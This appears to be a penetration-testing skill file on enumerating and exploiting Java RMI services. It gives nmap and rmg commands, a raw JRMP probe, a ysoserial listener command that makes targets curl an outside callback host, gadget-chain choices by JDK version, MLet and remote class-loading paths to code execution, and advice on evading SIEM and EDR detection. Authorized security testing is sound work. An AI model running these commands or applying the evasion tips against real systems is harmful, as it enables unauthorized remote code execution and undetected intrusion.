---
name: java-rmi-enum
description: Java RMI service enumeration — detect RMI registries, enumerate bound objects, identify deserialization surface, and assess RMI security posture
version: 1.0.0
phase: enum
category: enumeration
tags: [java-rmi, rmi, deserialization]
tools: [nmap, rmg, python3, ysoserial]
difficulty: advanced
opsec_level: high
time_estimate: 45m
severity_if_found: critical
mitre_attack:
  - T1046
  - T1190
---

## When to Use

- Port scan reveals port 1099, 1100+ or other RMI registry ports open
- Java application stack identified via tech fingerprinting (JBoss, WebLogic, WebSphere, OpenJDK)
- Internal network segment penetration where distributed Java services are common
- Legacy enterprise application assessment — prevalent in financial and government sectors
- Insecure deserialization is in scope

**Risk**: Exposed RMI registries on unpatched JVMs lead to unauthenticated RCE via deserialization with no credentials required. This is one of the quickest paths from port scan to full server compromise in enterprise environments.

## What It Does

Enumerates Java RMI services to assess deserialization vulnerability posture.

**RMI registry discovery**: Locates RMI registries on default (1099) and non-standard ports — 1100+ (alternate registries), 7001/7002 (WebLogic), 1090/4444/4445 (JBoss), 9990/9999 (WildFly), 1098 (activation daemon). Uses nmap NSE scripts and raw JRMP protocol probes.

**Bound object enumeration**: Lists all remote objects bound to the registry using `rmg list` and Nmap NSE rmi-dumpregistry. High-value objects include jmxrmi (→ JMX auth bypass → MLet → RCE), UserTransaction, RMIServer, RMIConnection, RemoteClassLoader, and invoker. Each bound object is a distinct attack surface.

**JVM version fingerprinting**: Identifies JVM version from JRMP stream protocol handshake. This determines available deserialization chains: JDK < 8u20 (CommonsCollections1-7 available), JDK 8u20-8u121 (CommonsCollections2/4, Jdk8u20), JDK > 8u121 (URLDNS, JRMPClient only — significantly reduced surface).

**Deserialization gadget chain assessment**: Uses `rmg blind` and `ysoserial` to test available gadget chains. Prefers collaborative callback (URLDNS) for verification to avoid crashing the registry process.

**SSL/TLS audit and codebase annotation**: Validates whether encryption is enforced. Tests for remote class loading via `java.rmi.server.codebase` annotation. If present with `useCodebaseOnly=false`, attacker-controlled class loading enables immediate RCE without deserialization.

**DGC abuse**: Probes Distributed Garbage Collection endpoint on the same RMI port — always open and provides a reliable deserialization surface even when registry.list() is programmatically blocked.

## Methodology

### Step 1: Registry Discovery & Fingerprinting
```bash
# Broad RMI port scan across target subnet
nmap -p 1099,1100-1110,7001,7002,1090,4444,4445,9990,9999 --open -sV -T4 -oA rmi_discovery $TARGET_RANGE

# NSE scripts for RMI enumeration
nmap -p 1099 --script rmi-dumpregistry $TARGET
nmap -p 1099 --script rmi-vuln-classloader $TARGET

# JRMP version fingerprint via raw protocol handshake
echo -n '\x4a\x52\x4d\x49\x00\x00\x00\x02' | nc -w 3 $TARGET 1099 | xxd
```

### Step 2: Bound Object Enumeration
```bash
java -jar rmg.jar list $TARGET 1099
java -jar rmg.jar fingerprint $TARGET 1099
```
**Interpreting output**: `jmxrmi` is the jackpot — JMX over RMI with default credentials grants access to MBean server, and the MLet MBean can load classes from arbitrary URLs. `invoker` and `RemoteClassLoader` are similarly dangerous.

### Step 3: Version & Codebase Assessment
```bash
# JVM version drives chain selection
java -jar rmg.jar fingerprint $TARGET 1099
# Codebase annotation check
java -jar rmg.jar codebase $TARGET 1099
```
**Version mapping**: JDK < 8u20 allows CommonsCollections1-7 chains. JDK 8u20-8u121 requires CommonsCollections2/4 or Jdk8u20. JDK > 8u121 shrinks options to URLDNS and JRMPClient. Codebase + `useCodebaseOnly=false` = immediate RCE via attacker-hosted class loading — no deserialization needed.

### Step 4: Deserialization Gadget Chain Probing
```bash
# Non-invasive existence check
java -jar rmg.jar blind $TARGET 1099
java -jar rmg.jar activate $TARGET 1099

# Collaborative callback verification
java -jar ysoserial.jar JRMPListener 9999 CommonsCollections2 'curl http://COLLABORATOR/callback'
```
**Warning**: `rmg blind` sends deserialization payloads — the registry process may crash. Use against non-production targets or during authorized windows. Prefer URLDNS chain for callback-based verification without service impact.

### Step 5: DGC Abuse — Always-Open Surface
```python
import socket; import struct
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5); sock.connect(('$TARGET', 1099))
stream = sock.recv(4); print(f"Stream protocol: {stream.hex()}")
sock.send(b'\x4c\x00\x00\x00\x00')  # DGC clean opcode
resp = sock.recv(1024); print(f"DGC response: {resp[:50].hex()}"); sock.close()
```
DGC is always present on the RMI port — it provides a reliable deserialization attack surface even when `registry.list()` is blocked by firewalls or code changes.

### Step 6: SSL/TLS & Full Automation
```bash
# SSL/TLS enforcement check
java -jar rmg.jar sslcheck $TARGET 1099
nmap -p 1099 --script ssl-enum-ciphers $TARGET

# Everything in one pass
java -jar rmg.jar --all $TARGET 1099
```

### Step 7: Identifying and Interpreting Results

After enumeration, assess findings to determine the exploitation path. The presence of a bound `jmxrmi` object is typically the fastest path to RCE via the MLet MBean — no deserialization required, just a class loader pointing to your server. If no jmxrmi is present but bound objects exist, the path goes through ysoserial gadget chains based on the JVM version identified in Step 3.

After enumeration, assess findings against this table:

| Finding | Severity | Chain |
|---------|----------|-------|
| Old JDK (< 8u20) + DGC | Critical | CommonsCollections1-7 |
| jmxrmi bound object | Critical | JMX MLet → RCE |
| Codebase annotation | Critical | Remote class loading |
| New JDK + any bound object | High | JRMPClient callback |
| SSL not enforced | Medium | MITM on RMI traffic |

## Detection & OPSEC

**What Triggers Alerts**: RMI list() calls from unexpected IPs trigger SIEM baseline violations. Repeated JRMP handshakes from the same source look like reconnaissance scanning. Deserialization payload signatures in RMI stream data — Deep Packet Inspection can detect ysoserial byte patterns. DGC traffic anomalies (floods of clean/dirty calls). Remote class loading activity — unusual HTTP connections from the RMI server to external IPs on non-standard ports. Registry process crashes from blind probes are the loudest signal and trigger immediate investigation.

**OPSEC Countermeasures**: Prefer passive fingerprinting first — version info from a single JRMP handshake determines risk without sending payloads. Use collaborative callback (URLDNS chain) for deserialization verification instead of direct blind payloads. Proxy through compromised internal hosts — RMI is almost never internet-facing. Space registry operations 30-60s apart to avoid aggregation alerts. Repackage rmg JAR or compile from source to avoid hash-based AV/EDR detection — rmg has well-known signatures. Avoid DGC abuse in the initial pass — it triggers behavioral monitoring more than a simple list() call.

**Exploitation Chain Reference**: (1) Start ysoserial JRMPListener on your host with the identified chain. (2) Make the target RMI registry call back to your listener — deserialization of the callback payload delivers command execution. For JMX-based targets: connect via JConsole or mx4j, locate the MLet MBean, point it to your malicious MBean server URL, invoke getMBeansFromURL to load and execute your class remotely.

**Evidence Collection**: nmap NSE output for rmi-dumpregistry and rmi-vuln-classloader. Bound object names with full Remote interface signatures. JVM version from JRMP handshake (drives chain selection in the report). SSL/TLS cipher list. Codebase annotation presence or absence. DGC interface accessibility confirmation. Full rmg stdout logged to file.

**Severity Escalation Paths**:
- `jmxrmi` bound → JMX auth bypass → MBean server → RCE via MLet URL loading
- Codebase annotation present → remote class loading → arbitrary code execution
- Old JDK version + DGC exposed → deserialization → RCE via ysoserial chain
- No SSL enforced → MITM deserialization injection on the wire

**Caveat**: RMI exploitation can crash the target JVM if the wrong gadget chain is used during active testing. Always confirm the JDK version via passive fingerprinting before selecting a chain. Prefer one-shot callback techniques (URLDNS, JRMPClient) over direct deserialization to minimize service impact during enumeration.

**Reporting template**: Document the JVM version, bound objects list, codebase status, DGC accessibility, SSL enforcement, and recommended gadget chain per JVM version for the report.

## References

- [rmg — RMI enumeration & exploitation](https://github.com/BishopFox/rmg)
- [ysoserial — Deserialization gadget chains](https://github.com/frohoff/ysoserial)
- [Nmap NSE rmi-dumpregistry](https://nmap.org/nsedoc/scripts/rmi-dumpregistry.html)
- [marshalsec — Java unmarshaller security](https://github.com/mbechler/marshalsec)
- [Oracle RMI Security Guide](https://docs.oracle.com/en/java/javase/21/rmi/)
- [Java Deserialization Scanner Burp Plugin](https://github.com/federicodotta/Java-Deserialization-Scanner)
- [MITRE T1046 — Network Service Scanning](https://attack.mitre.org/techniques/T1046/)
- [MITRE T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
